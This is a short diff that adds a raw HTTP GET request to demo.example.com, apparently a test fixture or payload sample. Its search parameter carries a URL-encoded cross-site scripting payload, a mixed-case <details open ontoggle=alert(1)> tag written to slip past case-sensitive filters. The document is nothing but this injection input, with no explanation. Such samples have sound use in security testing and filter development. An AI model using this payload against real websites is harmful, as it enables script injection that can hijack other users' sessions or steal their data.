@@ -1,0 +1,4 @@
+GET /a?search=<dEtAiLs%20OpEn%20OnToGgLe%3DAlErT(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
